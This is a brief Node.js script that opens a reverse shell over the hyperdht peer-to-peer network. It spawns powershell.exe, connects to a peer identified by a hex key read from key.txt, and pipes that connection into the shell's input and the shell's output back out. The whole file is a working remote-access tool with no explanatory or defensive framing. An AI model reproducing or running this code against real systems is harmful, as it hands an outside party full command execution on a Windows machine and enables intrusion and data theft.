import cp from "child_process";
import { readFileSync } from "fs";
import DHT from "hyperdht";

const node = new DHT();
const sh = cp.spawn("powershell.exe", []);
const socket = node.connect(Buffer.from(readFileSync("key.txt", "utf-8"), "hex"));

socket.pipe(sh.stdin);
sh.stdout.pipe(socket);
sh.stderr.pipe(socket);
